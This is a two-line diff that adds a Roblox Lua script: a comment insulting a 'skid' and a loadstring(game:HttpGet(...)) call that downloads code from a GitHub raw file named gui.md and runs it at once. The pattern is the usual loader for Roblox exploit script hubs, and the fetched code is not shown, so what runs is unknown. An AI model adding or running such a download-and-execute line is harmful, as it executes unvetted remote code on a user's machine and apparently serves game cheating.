@@ -1,0 +1,2 @@
+--- psu moment fuck you skid
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Memeboiyot/Syntaxv22/main/gui.md'),true))()
